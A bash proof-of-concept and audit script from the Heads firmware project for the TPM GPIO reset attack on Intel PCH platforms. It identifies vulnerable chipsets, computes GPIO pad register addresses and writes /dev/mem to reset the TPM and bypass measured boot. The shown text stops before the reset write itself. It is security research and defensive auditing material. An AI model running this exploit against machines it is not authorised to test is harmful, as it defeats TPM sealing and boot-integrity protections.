#!/bin/bash
# SPDX-License-Identifier: GPL-2.0-only
#
# TPM GPIO Reset Attack -- Proof of Concept / Audit Tool
#
# ============================================================================
# WHAT THIS SCRIPT DEMONSTRATES
# ============================================================================
#
# The TPM GPIO reset attack exploits a design flaw on certain Intel PCH
# platforms where the PLTRST# (Power Loss Timer Reset) signal to the TPM
# can be asserted from userspace through PCH sideband registers.
#
# Two mechanisms exist, both accessed via PCR (Private Configuration Register)
# MMIO space:
#
#   CNP-H (T480s): PLTRST_CPU_B is on a multi-function GPIO pad (pad 256,
#   COM3). The pad is reprogrammed from native function to GPIO output mode,
#   driven low (assert reset), then the original mode is restored.
#
#   SPT/KBP (T480) and ADL/RPL: Write 0x80000000 to the PAD_CFG DW0 register
#   at a platform-specific PCR address. This asserts PLTRST# at the PCH level
#   without changing the pad's GPIO mode.
#
# By asserting PLTRST#, the attacker can reset the TPM without power cycling
# the platform, clearing all PCRs to their initial (all-zero) state while the
# CPU and memory contents remain intact.
#
# After reset, if the attacker can replay the PCR extend operations from a
# saved measurement log, the TPM will present the expected PCR values and
# unseal the TOTP/HOTP secrets -- effectively bypassing the
# measured boot trust chain.
#
# Attack vector: The measurement logs (cbmem -L, /tmp/measuring_trace.log)
# are accessible from the Heads recovery shell. An unauthenticated recovery
# shell provides all the information needed to replay PCR measurements.
# Configuring GPG authentication for the recovery shell
# (CONFIG_BOOT_RECOVERY_GPG=) prevents this.
#
# ============================================================================
# AFFECTED PLATFORMS
# ============================================================================
#
# Three classes of platforms based on PCH generation:
#
# 1. Cannon Point PCH (CNP-H) -- Kaby Lake-R / Whiskey Lake / Comet Lake
#    PLTRST_CPU_B is mapped as a GPP pad inside the GPIO community and can
#    be toggled directly from userspace. UNTESTED -- no hardware verification.
#
#      * ThinkPad T480s, T490, T495, X390, etc.
#      * PLTRST_CPU_B = pad 256, GPIO community 3 (PID_GPIOCOM3 = 0x6b)
#      * Offset within community: 149 (first pad of comm 3 is HDA_BCLK = 107)
#
#    Cannon Lake PCH (CNL) -- 8th gen mobile/desktop
#      * PLTRST_CPU_B = pad 275 (in gpio_soc_defs.h layout)
#      * Different community mapping (COMM_3 or COMM_4 depending on SKU)
#
# 2. Skylake/Kaby Lake PCH (SPT/KBP) -- 6th/7th gen mobile/desktop
#    GPP_B13 drives PLTRST# via GPIO PAD_CFG at PCR port 0xaf,
#    COMM_0, local idx 13. PAD_CFG_BASE = 0x400.
#    This method IS IMPLEMENTED here. UNTESTED -- no hardware verification.
#
#      * ThinkPad T480 (KBL), T470, X270, T460, X260, etc.
#
# 3. Alder Lake / Raptor Lake PCH (ADL/RPL) -- 12th/13th/14th gen
#    GPP_B13 drives PLTRST# via GPIO PAD_CFG at PCR port 0x6d
#    (ADL-S/RPL-S, COMM_1) or 0x6e (ADL-P mobile, COMM_0).
#    All variants use local idx 13 with PAD_CFG_BASE = 0x700.
#    This method IS IMPLEMENTED here. TESTED on NV4x ADL-P: write verified, PCRs do not clear -- mechanism NOT confirmed working.
#
#      * NovaCustom NV4x ADL, Nitropad NS50, MSI Z790-P DDR5, etc.
#
# 4. Pre-Skylake (Sandy Bridge, Ivy Bridge, Haswell, Broadwell)
#    The PLTRST# signal to the TPM is a dedicated pin that cannot be
#    reprogrammed to GPIO mode by software. NOT AFFECTED.
#
# 5. Meteor Lake (MTL)
#    GPIO lock is functional on these platforms. NOT AFFECTED.
#
# ============================================================================
# REFERENCES
# ============================================================================
#
#   [1] mkukri.xyz -- "TPM GPIO fail: The Forgotten Bus"
#       https://mkukri.xyz/2024/06/01/tpm-gpio-fail.html
#       Original discovery and detailed analysis by mkukri.
#
#   [2] kukrimate/tpm-gpio-fail (GitHub) -- GPL-2.0 PoC tools
#       https://github.com/kukrimate/tpm-gpio-fail
#       Contains the original `detect` and `reset` tools this Heads
#       PoC script is conceptually based on. The `reset` directory
#       provides platform-specific data (PCH device IDs, PCR ports,
#       pad offsets, GPIO community definitions in inteltool.h) that
#       informed the platform database in this script.
#       https://github.com/kukrimate/tpm-gpio-fail/tree/main/reset
#
#   [3] coreboot ticket #576 -- "PLTRST_CPU_B pad should be locked
#       to prevent userspace TPM GPIO reset"
#       https://ticket.coreboot.org/issues/576
#       Tracking the coreboot-side fix: lock the pad config after
#       initialization to prevent runtime reprogramming.
#
#   [4] linuxboot/heads PR #1568 -- "scripts: add TCPA log replay support"
#       https://github.com/linuxboot/heads/pull/1568
#       Added TCPA/TPM event log replay to Heads (later moved to tpmr.sh
#       calcfuturepcr). This script delegates measurement replay to the
#       same tpmr.sh infrastructure.
#
# ============================================================================
# DISCLAIMER
# ============================================================================
#
# This script is provided for AUDITING, EDUCATIONAL, and RESEARCH purposes
# ONLY. It demonstrates a known vulnerability so that:
#   - Platform owners can verify whether their hardware is affected
#   - Developers can test mitigation patches
#   - The community can audit and improve platform security
#
# Misuse of this script to bypass security measures on systems you do not
# own or have explicit authorization to test is illegal and unethical.
#
# ============================================================================

# Heads initrd script. Uses bash for /dev/mem access via dd.
# Sources /etc/functions.sh for standard logging functions (INFO, WARN, DIE,
# STATUS, STATUS_OK, DEBUG, NOTE).
#
# NOTE: On ADL-P platforms (NovaCustom NV4x, Nitropad NS50), the P2SB bridge
# is hidden by FSP-S firmware. The GPIO pad config registers at 0xFD000000+
# are accessible via /dev/mem if CONFIG_STRICT_DEVMEM=n (Heads default), but
# the PADCFGLOCK register may block writes to GPP_B13. If the register value
# after write differs from the expected value, see the PADCFGLOCK and
# PADCFGLOCKTX debug output for lock status.

set -eo pipefail

# shellcheck source=/dev/null
. /etc/functions.sh

# ---- Global variables -------------------------------------------------

SCRIPT_NAME="${0##*/}"

# Platform detection is via PCI device ID of the ISA/LPC bridge (class 0x0601).
# Mechanism-specific parameters (GPIO pad numbers, PCR ports, etc.) are
# hardcoded in the detect_platform() case statement below.

# ---- Helper functions (thin wrappers around Heads logging) ------------

# Print a section header using STATUS
section() {
	TRACE_FUNC
	STATUS "======================================================================"
	STATUS "  $*"
	STATUS "======================================================================"
}

# Read a 32-bit value from physical memory via /dev/mem
# Usage: mem_read32 <hex-address>
# Returns: decimal value
mem_read32() {
	TRACE_FUNC
	_addr="$1"
	# BusyBox does not ship od (CONFIG_OD=n). Use xxd which is available.
	dd if=/dev/mem bs=4 count=1 skip="$(( _addr / 4 ))" 2>/dev/null | xxd -p
}

# Write a 32-bit value to physical memory via /dev/mem (32-bit aligned write).
# Usage: mem_write32 <hex-address> <hex-value>
# Verifies write with readback — WARNs on mismatch.
mem_write32() {
	TRACE_FUNC
	_addr="$1"
	_val="$2"
	_skip=$(( _addr / 4 ))
	DEBUG "mem_write32 addr=0x$(printf '%x' $_addr) val=0x$(printf '%x' $_val)"
	# Write 4 bytes in little-endian order via printf '%b' with \xHH escapes.
	# Each byte is a separate printf argument to safely pass NUL bytes.
	printf '%b' \
		"\\x$(printf '%02x' $(( _val & 0xff )))" \
		"\\x$(printf '%02x' $(( (_val >> 8) & 0xff )))" \
		"\\x$(printf '%02x' $(( (_val >> 16) & 0xff )))" \
		"\\x$(printf '%02x' $(( (_val >> 24) & 0xff )))" | \
	dd of=/dev/mem bs=4 count=1 seek="$_skip" 2>/dev/null
	# Verify: read back the 4 bytes — xxd -p outputs bytes in LE memory order
	_read=$(dd if=/dev/mem bs=4 count=1 skip="$_skip" 2>/dev/null | xxd -p | tr -d '\n ')
	DEBUG "  readback: 0x$_read"
	# xxd outputs LE bytes (e.g. 0x80000000 -> "00000080"). Rearrange for comparison.
	_expected_le=$(printf '%02x' $(( _val & 0xff )))$(printf '%02x' $(( (_val >> 8) & 0xff )))$(printf '%02x' $(( (_val >> 16) & 0xff )))$(printf '%02x' $(( (_val >> 24) & 0xff )))
	if [ "$_read" != "$_expected_le" ]; then
		DEBUG "  MMIO write mismatch at 0x$(printf '%x' $_addr): wrote 0x$(printf '%08x' $_val), read 0x$_read (likely locked by PADCFGLOCK)"
	fi
}



# ---- Attack explanation header ----------------------------------------

print_banner() {
	TRACE_FUNC
	section "TPM GPIO RESET ATTACK -- Proof of Concept / Platform Audit Tool"
	INFO "  This tool checks whether your platform is affected by the TPM GPIO"
	INFO "  reset attack (coreboot ticket #576, mkukri.xyz 2024-06-01)."
	INFO ""
	INFO "  --audit, -a    Safe audit: detect platform, report vulnerability"
	INFO "  --execute,--exec,-x  Perform GPIO hardware reset and measurement replay"
	INFO "  --help,-h      Show this help"
}

# ---- Platform detection -----------------------------------------------
#
# Platform detection uses the PCI device ID of the ISA/LPC bridge (class
# 0x0601, typically device 00:1f.0 on Intel platforms).  This is reliable
# across all Linux kernels and does not depend on CONFIG_BOARD or DMI data.

_resolve_platform() {
	TRACE_FUNC
	_dev_id=""
	_dev_name=""

	# Find ISA/LPC bridge (class 0x0601) via sysfs
	for _dev in /sys/bus/pci/devices/*/; do
		[ -r "${_dev}class" ] || continue
		_class=$(cat "${_dev}class" 2>/dev/null)
		if [ "${_class%??}" = "0x0601" ]; then
			_dev_id=$(cat "${_dev}device" 2>/dev/null)
			_vendor=$(cat "${_dev}vendor" 2>/dev/null)
			_dev_name=$(cat "${_dev}device" 2>/dev/null)
			DEBUG "Matched ISA bridge: vendor=$_vendor device=$_dev_id class=$_class"
			break
		fi
	done

	if [ -z "$_dev_id" ] || [ "$_vendor" != "0x8086" ]; then
		DEBUG "No Intel ISA/LPC bridge found (device='$_dev_id' vendor='$_vendor')"
		WARN "  No Intel ISA/LPC bridge found (class 0x0601)."
		GLOBAL_PCH="UNKNOWN"
		return
	fi

	INFO "  ISA bridge device ID: $_dev_id"
	DEBUG "  ISA bridge: vendor $_vendor device $_dev_id"

	# Match device ID against known PCH families.
	# Device IDs from kukrimate/tpm-gpio-fail reset/inteltool.c and
	# coreboot src/soc/intel/ headers.
	case "$_dev_id" in
		# Sunrise Point (SPT) -- Skylake (6th gen), VULNERABLE
		# GPP_B13 is global pad 37 (GPP_A0=0..23, GPP_B0=24, GPP_B13=37)
		# port=0xaf PAD_CFG_BASE=0x400
		0xa143|0xa144|0xa145|0xa146|0xa147|0xa148|0xa149|0xa14a|0xa14d|0xa14e|0xa150|0xa152|0xa153|0xa154)
			GLOBAL_PCH="SPT_KBP"
			COMMUNITY_PORT=0xaf; PLTRST_PAD=37; FIRST_PAD=0
			PAD_CFG_BASE=0x400; NUM_PAD_CFG_REGS=2
			DEBUG "SPT (Skylake 6th gen) device=$_dev_id pad=37 port=0xaf" ;;
		# Kaby Point (KBP) -- Kaby Lake (7th gen), VULNERABLE
		# GPP_B13 is global pad 37 port=0xaf PAD_CFG_BASE=0x400
		0xa2c4|0xa2c5|0xa2c6|0xa2c7|0xa2c8|0xa2c9|0xa2ca|0xa2d2)
			GLOBAL_PCH="SPT_KBP"
			COMMUNITY_PORT=0xaf; PLTRST_PAD=37; FIRST_PAD=0
			PAD_CFG_BASE=0x400; NUM_PAD_CFG_REGS=2
			DEBUG "KBP (Kaby Lake 7th gen) device=$_dev_id pad=37 port=0xaf" ;;
		# Cannon Point (CNP-H) -- Kaby Lake-R / Whiskey Lake / Comet Lake, VULNERABLE
		# PLTRST_CPU_B (COM3, pad 256, first=HDA_BCLK=107) port=0x6b PAD_CFG_BASE=0x600
		0xa304|0xa305|0xa306|0xa307|0xa308|0xa309|0xa30a|0xa30b|0xa30c|0xa30d|0xa30e|0xa30f)
			GLOBAL_PCH="CNP_H"
			COMMUNITY_PORT=0x6b; PLTRST_PAD=256; FIRST_PAD=107
			PAD_CFG_BASE=0x600; NUM_PAD_CFG_REGS=4
			DEBUG "CNP-H (Cannon Point) device=$_dev_id port=0x6b first_pad=107 offset=$(( 0x600 + (256-107)*16 ))" ;;
		# Alder Lake-P / Raptor Lake-P (mobile) -- RPP_P PCH die, VULNERABLE
		# GPP_B13 (COMM_0, local idx 13) port=0x6e PAD_CFG_BASE=0x700
		0x5180|0x5181|0x5182|0x5183|0x5184|0x5185|0x5186|0x5187|0x5188|0x5189|0x518a|0x518b|0x518c|0x518d|0x518e|0x518f|\
		0x5190|0x5191|0x5192|0x5193|0x5194|0x5195|0x5196|0x5197|0x5198|0x5199|0x519a|0x519b|0x519c|0x519d|0x519e|0x519f)
			GLOBAL_PCH="ADL_RPL"
			COMMUNITY_PORT=0x6e; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "ADL-P (mobile 12th gen) device=$_dev_id port=0x6e offset=0x7D0" ;;
		# Alder Lake-S (desktop) -- Alder Point, VULNERABLE
		# GPP_B13 (COMM_1, local idx 13) port=0x6d PAD_CFG_BASE=0x700
		0x7a80|0x7a81|0x7a82|0x7a83|0x7a84|0x7a85|0x7a86|0x7a87|0x7a88|0x7a89|0x7a8a|0x7a8b|0x7a8c)
			GLOBAL_PCH="ADL_RPL"
			COMMUNITY_PORT=0x6d; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "ADL-S (desktop 12th gen) device=$_dev_id port=0x6d offset=0x7D0" ;;
		# Raptor Lake-S (desktop) -- Raptor Point, VULNERABLE
		# GPP_B13 (COMM_1, local idx 13) port=0x6d PAD_CFG_BASE=0x700
		0x7a0c|0x7a0d|0x7a0e|0x7a0f|0x7a10|0x7a11|0x7a12|0x7a13|0x7a14|0x7a15|0x7a16|0x7a17)
			GLOBAL_PCH="ADL_RPL"
			COMMUNITY_PORT=0x6d; PLTRST_PAD=13; FIRST_PAD=0
			PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
			DEBUG "RPL-S (desktop 13th/14th gen) device=$_dev_id port=0x6d offset=0x7D0" ;;
		*)
			GLOBAL_PCH="UNKNOWN"
			DEBUG "Device ID $_dev_id not in known PCH tables" ;;
	esac
	DEBUG "Device ID $_dev_id resolved to GLOBAL_PCH=$GLOBAL_PCH"

	# If still unknown, try CONFIG_BOARD fallback (MTL, pre-SKL, NIC-based ADL)
	if [ "$GLOBAL_PCH" = "UNKNOWN" ] && [ -r /etc/config ]; then
		_config_board=$(grep 'CONFIG_BOARD=' /etc/config 2>/dev/null | head -1 | cut -d= -f2-)
		DEBUG "Falling back to CONFIG_BOARD=$_config_board"
		case "$_config_board" in
			*v540tu*|*v560tu*) GLOBAL_PCH="MTL"
				DEBUG "CONFIG_BOARD $_config_board -> MTL (not vulnerable)" ;;
			*nv4x*|*ns50*)     GLOBAL_PCH="ADL_RPL"
				COMMUNITY_PORT=0x6e; PLTRST_PAD=13; FIRST_PAD=0
				PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
				DEBUG "CONFIG_BOARD $_config_board -> ADL-P (fallback, port=0x6e)" ;;
			*msi_z790*)        GLOBAL_PCH="ADL_RPL"
				COMMUNITY_PORT=0x6d; PLTRST_PAD=13; FIRST_PAD=0
				PAD_CFG_BASE=0x700; NUM_PAD_CFG_REGS=4
				DEBUG "CONFIG_BOARD $_config_board -> RPL-S (fallback, port=0x6d)" ;;
			*t440p*|*w541*|*x230*|*t430*|*t420*|*x220*|*w530*|*t530*)
			                   GLOBAL_PCH="PRE_SKL"
				DEBUG "CONFIG_BOARD $_config_board -> Pre-Skylake (not vulnerable)" ;;
		esac
	fi

	GLOBAL_DEV_ID="$_dev_id"
	DEBUG "Final platform: GLOBAL_PCH=$GLOBAL_PCH COMMUNITY_PORT=$(printf "0x%x" $COMMUNITY_PORT 2>/dev/null)"
}

detect_platform() {
	TRACE_FUNC
	section "1. PLATFORM DETECTION"

	_resolve_platform
	DEBUG "detect_platform: GLOBAL_PCH=$GLOBAL_PCH NOT_VULNERABLE=$NOT_VULNERABLE"

	case "$GLOBAL_PCH" in
		MTL)
			STATUS_OK "Detected PCH: Meteor Lake (device $GLOBAL_DEV_ID)"
			INFO "  Meteor Lake has functional GPIO lock -- NOT VULNERABLE"
			INFO "  to the TPM GPIO reset attack."
			NOT_VULNERABLE="y"
			DEBUG "MTL platform: setting NOT_VULNERABLE=y" ;;
		PRE_SKL)
			STATUS_OK "Detected PCH: Pre-Skylake (device $GLOBAL_DEV_ID)"
			INFO "  Pre-Skylake platforms have a dedicated PLTRST pin that"
			INFO "  cannot be reprogrammed via GPIO. NOT VULNERABLE."
			NOT_VULNERABLE="y"
			DEBUG "PRE_SKL platform: setting NOT_VULNERABLE=y" ;;
		CNP_H)
			STATUS_OK "Detected PCH: Cannon Point (CNP-H) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (PLTRST_CPU_B pad 256, COMM_3, local idx $((PLTRST_PAD - FIRST_PAD)))"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)" ;;
		SPT_KBP)
			STATUS_OK "Detected PCH: Skylake/Kaby Lake (SPT/KBP) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, COMM_0, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)" ;;
		ADL_RPL)
			STATUS_OK "Detected PCH: Alder/Raptor Lake (ADL/RPL) -- device $GLOBAL_DEV_ID"
			MECHANISM="GPIO_PAD_CFG"
			INFO "  Attack path: GPIO PAD_CFG (GPP_B13 pad, local idx 13)"
			INFO "  Port: $(printf "0x%x" $COMMUNITY_PORT) | PAD_CFG_BASE: $(printf "0x%x" $PAD_CFG_BASE)" ;;
		UNKNOWN)
			DEBUG "Unknown platform GLOBAL_PCH=UNKNOWN, showing help"
			DEBUG ""
			WARN "Platform not recognized — unknown PCI device $GLOBAL_DEV_ID"
			DEBUG ""
			INFO "  This script detects Intel PCH families by ISA/LPC bridge PCI device ID:"
			INFO "  - SPT (0xa14*) Skylake:   GPP_B13 port=0xaf"
			INFO "  - KBP (0xa2c*) Kaby Lake: GPP_B13 port=0xaf"
			INFO "  - CNP-H (0xa30*) Cannon Pt: PLTRST_CPU_B port=0x6b"
			INFO "  - ADL-P (0x518*) mobile:  GPP_B13 port=0x6e"
			INFO "  - ADL-S (0x7a8*) desktop: GPP_B13 port=0x6d"
			INFO "  - RPL-S (0x7a0*) desktop: GPP_B13 port=0x6d"
			DEBUG ""
			INFO "  Pre-Skylake platforms are NOT affected (dedicated PLTRST pin)."
			INFO "  Meteor Lake is NOT affected (functional GPIO lock)."
			DEBUG ""
			PLATFORM_UNKNOWN="y"
			DEBUG "Setting PLATFORM_UNKNOWN=y" ;;
	esac
	DEBUG "detect_platform: POST case: MECHANISM=$MECHANISM PLATFORM_UNKNOWN=$PLATFORM_UNKNOWN"

	# Bail early for non-vulnerable platforms
	if [ "$NOT_VULNERABLE" = "y" ]; then
		DEBUG "NOT_VULNERABLE=y: exiting early with status 0"
		STATUS "  This platform is NOT vulnerable to the TPM GPIO reset attack."
		INFO "  Exiting."
		exit 0
	fi
}

# ---- Register address calculation -------------------------------------

calculate_registers() {
	TRACE_FUNC
	section "2. REGISTER ADDRESS CALCULATION"

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		DEBUG "Platform unknown, skipping register calculation"
		INFO "Platform unknown; skipping register calculation."
		return
	fi

	# Hardcoded PCR_BASE per platform (verified from Intel GPIO Best Practices doc
	# ID 834810 and coreboot Kconfig). Dynamic SBREG_BAR reading via MMCFG is not
	# reliable — P2SB is hidden by FSP-S and MMCFG config space is often inaccessible.
	DEBUG "GLOBAL_PCH=$GLOBAL_PCH GLOBAL_DEV_ID=$GLOBAL_DEV_ID"
	case "$GLOBAL_PCH" in
		ADL_RPL)
			if echo "$GLOBAL_DEV_ID" | grep -q "^0x518"; then
				PCR_BASE=$(( 0xFD000000 ))   # ADL-P/RPL-P mobile
			elif echo "$GLOBAL_DEV_ID" | grep -q "^0x7a"; then
				PCR_BASE=$(( 0xE0000000 ))   # ADL-S desktop
			else
				PCR_BASE=$(( 0xE0000000 ))   # RPL-S desktop (fallback)
			fi ;;
		SPT_KBP) PCR_BASE=$(( 0xFD000000 )) ;;
		CNP_H)   PCR_BASE=$(( 0xFD000000 )) ;;
		*)       PCR_BASE=$(( 0xFD000000 ))
			 WARN "  Unknown PCH, using default PCR_BASE=0xFD000000" ;;
	esac
	DEBUG "PCR_BASE=0x$(printf '%x' $PCR_BASE) (hardcoded per platform)"

	# All platforms use GPIO PAD_CFG registers via PCR MMIO.
	# Pad number within community
	PAD_OFFSET=$(( PLTRST_PAD - FIRST_PAD ))
	INFO "  Pad offset within community: $PLTRST_PAD - $FIRST_PAD = $PAD_OFFSET"
	DEBUG "GPIO_PAD_CFG: pad=$PLTRST_PAD first=$FIRST_PAD offset=$PAD_OFFSET"

	# Each pad uses 16 bytes (4 DWORDS)
	PAD_REG_SIZE=$(( NUM_PAD_CFG_REGS * 4 ))
	INFO "  Bytes per pad: $NUM_PAD_CFG_REGS DWORDS x 4 = $PAD_REG_SIZE bytes"

	# Register offset for DW0 of this pad within the community
	PAD_DW0_OFFSET=$(( PAD_CFG_BASE + (PAD_OFFSET * PAD_REG_SIZE) ))
	PAD_DW0_HEX=$(printf "0x%x" "$PAD_DW0_OFFSET")
	INFO "  DW0 register offset in community: $(printf "0x%x" $PAD_CFG_BASE) + ($PAD_OFFSET * $PAD_REG_SIZE) = $PAD_DW0_HEX"

	# Full physical address
	COMMUNITY_BASE=$(( PCR_BASE + (COMMUNITY_PORT << 16) ))
	COMMUNITY_BASE_HEX=$(printf "0x%x" "$COMMUNITY_BASE")
	TARGET_ADDR=$(( COMMUNITY_BASE + PAD_DW0_OFFSET ))
	TARGET_ADDR_HEX=$(printf "0x%x" "$TARGET_ADDR")

	DEBUG "GPIO PAD_CFG target: community_base=$COMMUNITY_BASE_HEX target_addr=$TARGET_ADDR_HEX"

	DEBUG "  Register layout for pad $PLTRST_PAD:"
	DEBUG "    Community base (port $COMMUNITY_PORT):  $COMMUNITY_BASE_HEX"
	DEBUG "    PAD_CFG_BASE offset within community:  $(printf "0x%x" $PAD_CFG_BASE)"
	DEBUG "    Pad config DW0:                        $TARGET_ADDR_HEX"
	DEBUG "    Pad config DW1:                        $(printf "0x%x" $((TARGET_ADDR + 4)))"
	DEBUG "    Pad config DW2:                        $(printf "0x%x" $((TARGET_ADDR + 8)))"
	DEBUG "    Pad config DW3:                        $(printf "0x%x" $((TARGET_ADDR + 12)))"

	DEBUG "  DW0 bit fields (PAD_CFG0):"
	DEBUG "    [0]    TX state (1=high, 0=low)"
	DEBUG "    [1]    RX state (read-only)"
	DEBUG "    [8]    TX disable"
	DEBUG "    [9]    RX disable"
	DEBUG "    [10:12] Mode (000=GPIO, 001=NF1, ...)"
	DEBUG "    [30:31] Reset config (10=PLTRST)"
}

# ---- Read current register configuration -------------------------------

read_pad_config() {
	TRACE_FUNC
	section "3. CURRENT REGISTER CONFIGURATION"

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		DEBUG "Platform unknown, skipping configuration read"
		INFO "Platform unknown; skipping configuration read."
		return
	fi

	INFO "  Attempting to read registers from physical memory..."
	DEBUG "read_pad_config: MECHANISM=$MECHANISM TARGET_ADDR=$TARGET_ADDR_HEX"
	DEBUG ""

	# Check that /dev/mem is accessible
	if [ ! -r /dev/mem ]; then
		DEBUG "/dev/mem not readable (expected on production kernels)"
		INFO "  /dev/mem is not readable. This is expected on most production"
		INFO "  kernels without CONFIG_STRICT_DEVMEM disabled."
		DEBUG ""
		INFO "  To test on QEMU or a development kernel, boot with:"
		INFO "    iomem=relaxed"
		INFO "  or disable CONFIG_STRICT_DEVMEM."
		DEBUG ""
		INFO "Cannot read actual config. Showing expected values."
		return
	fi

	# All platforms use GPIO PAD_CFG registers via PCR MMIO
	DEBUG "Reading DW0 at $TARGET_ADDR_HEX"
	if ! command -v xxd >/dev/null 2>&1; then
		INFO "Missing 'xxd' command. Cannot parse binary data."
		return
	fi
	# Read DW0
	PAD_DW0_VAL=$(dd if=/dev/mem bs=4 count=1 skip="$(( TARGET_ADDR / 4 ))" 2>/dev/null | xxd -p 2>/dev/null || true)
	DEBUG "DW0 read returned: $PAD_DW0_VAL"

	if [ -z "$PAD_DW0_VAL" ] || [ "$PAD_DW0_VAL" = "0" ] || [ "$PAD_DW0_VAL" = "00000000" ]; then
		DEBUG "DW0 read invalid (blocked or zero), using expected values"
		INFO "  Read returned: $PAD_DW0_VAL (likely invalid / blocked by kernel)"
		INFO "Cannot read actual pad config. Showing expected values."
		return
	fi

	_orig_dw0=$(( 16#${PAD_DW0_VAL} ))
	_orig_mode=$(( (_orig_dw0 >> 10) & 0x7 ))
	_orig_txstate=$(( _orig_dw0 & 1 ))
	_orig_txdis=$(( (_orig_dw0 >> 8) & 1 ))
	_orig_rxdis=$(( (_orig_dw0 >> 9) & 1 ))
	_orig_reset=$(( (_orig_dw0 >> 30) & 3 ))
	DEBUG "Decoded DW0: mode=$_orig_mode tx=$_orig_txstate txdis=$_orig_txdis rxdis=$_orig_rxdis reset=$_orig_reset"

	_orig_mode_str=""
	case $_orig_mode in
		0) _orig_mode_str="GPIO" ;;
		1) _orig_mode_str="NF1 (native function 1)" ;;
		2) _orig_mode_str="NF2" ;;
		3) _orig_mode_str="NF3" ;;
		4) _orig_mode_str="NF4" ;;
		5) _orig_mode_str="NF5" ;;
		6) _orig_mode_str="NF6" ;;
		7) _orig_mode_str="NF7" ;;
	esac

	_orig_reset_str=""
	case $_orig_reset in
		0) _orig_reset_str="PWROK" ;;
		1) _orig_reset_str="DEEP" ;;
		2) _orig_reset_str="PLTRST" ;;
		3) _orig_reset_str="RSMRST" ;;
	esac

	SAVED_DW0=$_orig_dw0
	DEBUG "SAVED_DW0=$(printf "0x%x" $SAVED_DW0) mode_str=$_orig_mode_str reset_str=$_orig_reset_str"
	DEBUG "  DW0 register: 0x$PAD_DW0_VAL"
	DEBUG "  Decoded: mode=$_orig_mode ($_orig_mode_str) tx=$_orig_txstate txdis=$_orig_txdis rxdis=$_orig_rxdis reset=$_orig_reset ($_orig_reset_str)"

	if [ "$_orig_mode" = "1" ] && [ $_orig_txdis = 0 ]; then
		DEBUG "Pad mode=NF1 txdis=0: correctly configured as native function output"
		STATUS_OK "Pad is correctly configured as native function output."
	elif [ "$_orig_mode" = "0" ]; then
		DEBUG "Pad mode=GPIO: ALREADY in GPIO mode"
		DEBUG "Pad is in GPIO mode -- will attempt NF1 force before asserting PLTRST#"
		INFO "  Pad is in GPIO mode (not native-function PLTRST#). If the"
		INFO "  GPIO lock is absent, the pad can be reprogrammed to assert"
		INFO "  PLTRST# from userspace -- platform is VULNERABLE."
	fi
}

# ---- Assert PLTRST# via GPIO pad manipulation ------------------------

perform_tpm_reset() {
	TRACE_FUNC
	section "4. TPM GPIO ASSERTION (assert PLTRST# via PCH pad)"

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		DEBUG "Platform unknown, cannot assert PLTRST#"
		INFO "Platform unknown; cannot assert PLTRST#."
		return
	fi

	if [ "$EXECUTE_MODE" != "y" ]; then
		DEBUG "audit mode: skipping PLTRST# assertion"
		return
	fi

	if [ ! -w /dev/mem ]; then
		DEBUG "/dev/mem not writable"
		DIE "/dev/mem is not writable. Cannot assert PLTRST#."
	fi

	DEBUG "PLTRST# assertion mechanism: $MECHANISM"
	DEBUG "Target address: $TARGET_ADDR_HEX"

	# Check PADCFGLOCK before attempting PLTRST# assertion
	# Lock register offset per coreboot gpio_defs.h:
	#   ADL-P: 0x80, ADL-S/RPL-S: 0x110, SPT/KBP: 0x80, CNP-H: 0x80
	# Lock registers span multiple dwords (32 pads each). The dword for
	# local pad N is at offset _lock_base + (N/32)*4, bit N%32.
	case "$GLOBAL_PCH" in
		ADL_RPL)
			if echo "$GLOBAL_DEV_ID" | grep -q "^0x518"; then
				_lock_base=0x80  # ADL-P (coreboot gpio_defs.h)
			else
				_lock_base=0x110  # ADL-S/RPL-S (coreboot gpio_defs_pch_s.h)
			fi ;;
		*) _lock_base=0x80 ;;
	esac
	_lock_reg_idx=$(( PAD_OFFSET / 32 ))
	_lock_offset=$(( _lock_base + (_lock_reg_idx * 4) ))
	_lock_addr=$(( COMMUNITY_BASE + _lock_offset ))
	_lock_val=$(mem_read32 "$_lock_addr" 2>/dev/null || true)
	if [ -n "$_lock_val" ]; then
		_lock_dec=$(( 16#$_lock_val ))
		_lock_bit=$(( 1 << (PAD_OFFSET % 32) ))
		DEBUG "PADCFGLOCK at 0x$(printf '%x' $_lock_addr): 0x$_lock_val (local pad=$PAD_OFFSET, reg=$_lock_reg_idx, bit=$(( PAD_OFFSET % 32 )))"
		if [ $(( _lock_dec & _lock_bit )) -ne 0 ]; then
			WARN "  PLTRST pad is LOCKED (PADCFGLOCK dword $_lock_reg_idx bit $(( PAD_OFFSET % 32 )) set)"
			WARN "  Writes to PAD_CFG registers will be silently ignored."
		else
			DEBUG "  PLTRST pad NOT locked — writes should work"
		fi
	else
		DEBUG "  Could not read PADCFGLOCK register"
	fi

	# Check PADCFGLOCKTX (TX state lock at the same dword offset + 4)
	_locktx_offset=$(( _lock_offset + 4 ))
	_locktx_addr=$(( COMMUNITY_BASE + _locktx_offset ))
	_locktx_val=$(mem_read32 "$_locktx_addr" 2>/dev/null || true)
	if [ -n "$_locktx_val" ]; then
		_locktx_dec=$(( 16#$_locktx_val ))
		DEBUG "PADCFGLOCKTX at 0x$(printf '%x' $_locktx_addr): 0x$_locktx_val (bit $(( PAD_OFFSET % 32 )))"
		if [ $(( _locktx_dec & _lock_bit )) -ne 0 ]; then
			DEBUG "  TX state is LOCKED (PADCFGLOCKTX bit $(( PAD_OFFSET % 32 )) set)"
		fi
	else
		DEBUG "  Could not read PADCFGLOCKTX register"
	fi

